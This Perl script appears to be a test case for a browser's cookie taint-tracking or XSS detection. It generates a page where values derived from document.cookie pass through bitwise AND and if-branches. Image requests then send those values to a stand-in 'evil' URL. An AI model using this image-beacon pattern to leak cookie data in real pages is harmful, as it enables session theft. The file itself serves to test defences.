#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Test JSOP_BITAND";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">
    
		var notevil = 42;
		var evil = 3;
		if ($evil) {
			evil = 4;
		}
		
		// shouldn't be evil
		
		notevil = notevil & 7;
		var url = "$imgevilurl?normal=" + notevil;
		document.images[0].src = url;
		
		// if with evil val
		
		var notevil2 = 42;
		if ($evil) {
			 notevil2 = notevil2 & 7;
		}
		var url = "$imgevilurl?if=" + notevil2;
		document.images[1].src = url;
		
		// normal usage
		
		var notevil3 = 42 & evil;
		document.images[2].src = "$imgevilurl?isevil=" + notevil3;
		
    </script>
|;

require "xss_basic_footer.pl";
